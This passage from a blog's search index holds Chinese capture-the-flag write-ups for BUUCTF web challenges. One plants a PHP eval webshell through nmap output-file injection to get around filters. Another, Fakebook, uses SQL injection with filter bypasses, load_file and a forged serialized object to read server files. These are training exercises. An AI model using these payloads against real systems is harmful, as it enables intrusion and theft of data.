alt="image-20230822105623631"></p><p>发现输入的结果可能被过滤,采用第二个payload试试<br>payload2:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;pass&#x27;]);&lt;/script&gt; -oN pass.php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822105915275.png" alt="image-20230822105915275"></p><p>依然被过滤</p><p>4.现在就要一个个进行判断，寻找被过滤的内容:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt; <br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115002077.png" alt="image-20230822115002077"></p><p>存在黑名单内容</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115127287.png" alt="image-20230822115127287"></p><p>由于该文件不可被识别，所以就无法显示内容</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115207663.png" alt="image-20230822115207663"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?ph<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115311166.png" alt="image-20230822115311166"></p><p>所以过滤的内容为php,我们需要绕过php判断</p><p><strong>php一句话木马的构造</strong></p><p>可以解析php文件的后缀名:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">.php2<br>.php3<br>.php4<br>.php5<br>.phtml<br></code></pre></td></tr></table></figure><p>phtml:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;666&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">666<br></code></pre></td></tr></table></figure><p>php短标签：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;? echo &#x27;123&#x27;;?&gt;  #前提是开启配置参数short_open_tags=on<br>&lt;?=(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;  #不需要开启参数设置<br>&lt;% echo &#x27;123&#x27;;%&gt;   #开启配置参数asp_tags=on，并且只能在7.0以下版本使用<br>&lt;script language=&quot;php&quot;&gt;echo &#x27;123&#x27;; &lt;/script&gt; #不需要修改参数开关，但是只能在7.0以下可用。<br></code></pre></td></tr></table></figure><p>测试:<br><? echo '123';?> ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;888&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">888<br></code></pre></td></tr></table></figure><?=(表达式)?><p>  等价于 <?php echo (表达式)?> :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><br><span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag<br></code></pre></td></tr></table></figure><p>&lt;% echo ‘123’;%&gt; :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;%<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>%&gt;<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag<br></code></pre></td></tr></table></figure><p>使用短标签绕过php:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;? echo &#x27;123&#x27;;?&gt;  =&gt; &lt;? echo @eval($_POST[&#x27;pass&#x27;]);?&gt;<br>&lt;?=(表达式)?&gt;  =&gt; &lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt;<br>&lt;% echo &#x27;123&#x27;;%&gt; =&gt; &lt;% echo @eval($_POST[&#x27;pass&#x27;]);%&gt;<br></code></pre></td></tr></table></figure><p>测试:</p><? echo @eval($_POST['pass']);?><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span> <br><span class="hljs-keyword">echo</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;dir&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出：</p><p><img src="/images/2023-08-22_Nmap/image-20230822125459893.png" alt="image-20230822125459893"></p><?= @eval($_POST['pass'];?><p>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;dir&quot;</span>));<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果：</p><p><img src="/images/2023-08-22_Nmap/image-20230822125704414.png" alt="image-20230822125704414"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822130015713.png" alt="image-20230822130015713"></p><p>绕过</p><p>构造写文件输出payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt; -oG pass.phtml<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822131843981.png" alt="image-20230822131843981"></p><p>发现成功绕过:<br>访问pass.phtml:</p><p>由于当于oG输出的文件都在当前文件夹下所以为:<a href="http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.html">http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.html</a></p><p><img src="/images/2023-08-22_Nmap/image-20230822132212701.png" alt="image-20230822132212701"></p><p>发现当前网站下没有该文件，从之前的[BUUCTF 2018]Online Tool中获取的经验，nmap可能和escapeshellarg()与escapeshellcmd()配合使用，需要绕过这两个函数：使用空格和单引号,为了防止’pass’的单引号也被这两个函数过滤，我们这里使用”pass”:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#x27; &lt;?= @eval($_POST[&quot;pass&quot;]);?&gt; -oG pass.phtml &#x27;<br><br>&#x27; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822132957714.png" alt="image-20230822132957714"></p><p>访问pass.phtml:<a href="http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.phtml">http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.phtml</a></p><p><img src="/images/2023-08-22_Nmap/image-20230822132932341.png" alt="image-20230822132932341"></p><p>使用webshell测试:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&quot;ls&quot;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822133218223.png" alt="image-20230822133218223"></p><p>发现一个flag文件:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&quot;cat /flag&quot;);<br></code></pre></td></tr></table></figure><p>返回结果:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt"># Nmap 6.47 scan initiated Tue Aug 22 05:28:38 2023 as: nmap -Pn -T4 -F --host-timeout 1000ms -oX xml/e0e2e -oG pass.phtml \ flag&#123;544d334f-80b2-44f8-a3b1-c8b312b0b484&#125;<br> \\<br># Nmap done at Tue Aug 22 05:28:39 2023 -- 0 IP addresses (0 hosts up) scanned in 0.27 seconds<br></code></pre></td></tr></table></figure><p>flag&#x3D;flag{544d334f-80b2-44f8-a3b1-c8b312b0b484}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_Fakebook1 题解</title>
    <link href="/2023/08/21/2023-08-20-Fakebook1/"/>
    <url>/2023/08/21/2023-08-20-Fakebook1/</url>
    
    <content type="html"><![CDATA[<h1 id="Fakebook1"><a href="#Fakebook1" class="headerlink" title="Fakebook1"></a>Fakebook1</h1><p>1.点击登陆界面join,申请一个用户:<br>admin,123,18,bai.com</p><p>2.登录网站后，点击admin,发现网址有注入点:</p><p><a href="http://1886ff85-240c-42c7-84f0-3fa2575c0bb9.node4.buuoj.cn:81/view.php?no=1">http://1886ff85-240c-42c7-84f0-3fa2575c0bb9.node4.buuoj.cn:81/view.php?no=1</a></p><p>no,应该是记录的编号，我们可以通过no进行注入</p><p>注册一个账户之后自动生成记录的编号，所以编号为自动递增型为int</p><p>3.随便注入no&#x3D;1’,网页响应有sql报错，所以该网页存在sql语句注入</p><p>4.猜测该网页使用了select * from where no &#x3D; </p><p>所以我们可以用1 union select 1,2,3;#</p><p>但是返回了no hacker,所以可能过滤了select</p><p>所以可以用</p><p>– 内联注释绕过<br>&#x2F;*!select *&#x2F;1，2，3，4;</p><p>5.爆字段:1 order by 4;#</p><p>当order by 5#时报错，所以最大字段数为4</p><p>6.使用-1 union&#x2F;*!select *&#x2F;1，2，3，4;</p><p>只有username返回值为2，所以只有第二个字段能够成功返回值</p><p>使用-1是为了使响应网址只返回我们select的内容</p><p>7.爆数据库:-1 union&#x2F;*!select *&#x2F;1,database(),3,4;</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(database()),3,4;&#x2F;&#x2F;爆出所有数据库</p><p>uername爆出数据库为fakebook</p><p>只有一个数据库</p><p>8.爆表</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(table_name) ,3,4 from information_schema.tables where table_schema</p><p>&#x3D; DATABASE();&#x2F;&#x2F;database()可以直接显示当前数据库，一般是只有一个数据库才可以用，否则就要指定数据库</p><p>username字段显示users表</p><p>9.爆字段</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(column_name),3,4  from information_schema.COLUMNS where table_schema &#x3D; ‘fakebook’ and table_name &#x3D; ‘users’;</p><p>username字段显示no,username,passwd,data字段</p><p>data字段是之前没有看到过的，所以现在要查看字段的值</p><p>10.爆字段的值</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(data),3,4 from users</p><p>username:爆出字段值:O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:7:”bai.com”;} </p><p>这是一个序列化语句:表示有一个UserInfo类，这个类有参数name,age,blog</p><p>没有获得有用的信息，所以查看其他几个字段的内容</p><p>11.爆其他字段:</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(no,username,passwd),3,4 from users</p><p>username爆出字段的值:1admin3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</p><p>发现除了no和username字段其他为密文，进行解密:</p><p>3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</p><p>发现解密失败，所以可能不是密文</p><p>12.查看网页的robots.txt文件，查看网页还允许我们查看的文件有哪些:</p><p><a href="http://f848876c-8f1f-4fec-bdf5-2a6496754020.node4.buuoj.cn:81/robots.txt">http://f848876c-8f1f-4fec-bdf5-2a6496754020.node4.buuoj.cn:81/robots.txt</a></p><p>获得一个user.php.bak文件，将它下载:</p><p>13.分析user.php.bak中的代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//UserInfo类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">//有参申请类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<span class="hljs-comment">//curl_init()函数用于初始化一个新的会话，可以用于获取网页地址、设置网页头信息等</span><br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-comment">//curl_setopt — 设置一个cURL传输选项</span><br>        <span class="hljs-comment">//CURLOPT_URL: 这是你想用PHP取回的URL地址。你也可以在用curl_init()函数初始化时设置这个选项</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br>    <span class="hljs-comment">//blog内容的处理</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>该代码展示了一个UserInFo的类的具体内容和参数，以便之后的序列化处理</p><p>14.由网页显示的内容得：</p><p><strong>the contents of his&#x2F;her blog</strong></p><p><strong>下面一块不可见区域为，我们输入的blog（博客）的内容，所以猜测如果我们输入的博客内容为flag.php,则会显示该文件的内容，但是我们要知道网站flag.php的具体文件路径</strong></p><p><strong>网页中源代码的描述这块内容:</strong><br><strong>src &#x3D; ‘data:text&#x2F;html;base64,PCF………’</strong></p><p><strong>所以data的类型是text文本型</strong></p><p>所以网页的源地址传输为data,猜测可能利用的是第四个字段data中的内容:</p><p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:7:”bai.com”;} </p><p>data字段中的内容是经过序列化处理的结果</p><p>15.利用报错注入获取flag.php的文件路径:</p><p>or(updatexml(1,concat(‘<del>‘,(SELECT(load_file(“flag.php”)),’</del>‘),1))#</p><p>or(updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1))#</p><p>通过筛选，发现网站过滤了’x’</p><p>所以用字符’<del>‘:or(updatexml(1,concat(‘</del>‘,(SELECT(load_file(“flag.php”)),’~’),1))#</p><p>返回报错内容:</p><p>[*] query error! (Incorrect parameter count in the call to native function ‘updatexml’)</p><p><strong>Fatal error</strong>:  Call to a member function fetch_assoc() on boolean in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;db.php</strong> on line <strong>66</strong></p><p>所以我们猜测flag.php的地址为&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><p><strong>其实，随便输入一个错误的参数都会报错显示地址&#x2F;var&#x2F;www&#x2F;html&#x2F;db.php，所以一定要注意任何报错信息</strong></p><p>16.所以blog&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><p>所以要爆出该文件的内容:select load_file(“文件路径”);可以获取该文件的内容</p><p>-1 union&#x2F;*!select *&#x2F;1,load_file(“&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”),3,4</p><p><strong>username没有返回内容，但是页面产生了响应，说明username所显示的内容，不符合该字段所能显示的内容的格式，可以通过查看网页源代码，查看本来应该在该字段中显示的内容：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html">    <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;table&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><br>                username<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><br>                age<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><br>                blog<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>                <span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$flag = &quot;flag&#123;ab61868d-16df-4976-93c7-8980c7fbc7be&#125;&quot;;</span><br><span class="hljs-meta">exit(0);</span><br><span class="hljs-meta">            &lt;/td&gt;</span><br><span class="hljs-meta">            &lt;td&gt;</span><br><span class="hljs-meta">                &lt;br /&gt;</span><br><span class="hljs-meta">&lt;b&gt;Notice&lt;/b&gt;:  Trying to get property of non-object in &lt;b&gt;/var/www/html/view.php&lt;/b&gt; on line &lt;b&gt;53&lt;/b&gt;&lt;br /&gt;</span><br><span class="hljs-meta">            &lt;/td&gt;</span><br><span class="hljs-meta">            &lt;td&gt;</span><br><span class="hljs-meta">                &lt;br /&gt;</span><br><span class="hljs-meta">&lt;b&gt;Notice&lt;/b&gt;:  Trying to get property of non-object in &lt;b&gt;/var/www/html/view.php&lt;/b&gt; on line &lt;b&gt;56&lt;/b&gt;&lt;br /&gt;</span><br><span class="hljs-meta">            &lt;/td&gt;</span><br><span class="hljs-meta">        &lt;/tr&gt;</span><br><span class="hljs-meta">    &lt;/table&gt;</span><br></code></pre></td></tr></table></figure><p>所以flag为:</p><p>flag{ab61868d-16df-4976-93c7-8980c7fbc7be}</p><p>16.如果网站过滤了load_file(“路径”):</p><p>第四个字段data所显示的位置为:the contents of his&#x2F;her blog</p><p>该字段为将存储于数据库中的如O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:7:”bai.com”;} 的内容取出，然后根据该data中blog的地址，访问出blog的内容，所以我们可以让它显示&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php的内容</p><p>假设它网页是对这个序列化的内容base-64加密然后访问，则我们也只需要让它访问序列化的data：</p><p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}</p><p>payload:</p><p>-1 union&#x2F;*!select *&#x2F;1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”；}’:</p><p><strong>the contents of his&#x2F;her blog,没有显示内容，可能依然为非该字段的格式内容，所以查看网页源代码:</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>the contents of his/her blog<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&#x27;100%&#x27;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&#x27;10em&#x27;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3sxOTUxNDdkZi1iN2NhLTQ1NjAtYmVjYi1kOTg1OTI4NTBmYzh9IjsNCmV4aXQoMCk7DQo=&#x27;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这个区域显示的内容为src所指向区域，所以点击src所指向的区域:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;195147df-b7ca-4560-becb-d98592850fc8&#125;&quot;</span>;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>得到flag.php的内容</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/08/21/hello-world/"/>
    <url>/2023/08/21/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>First_blog</title>
    <link href="/2023/08/21/First-blog/"/>
    <url>/2023/08/21/First-blog/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
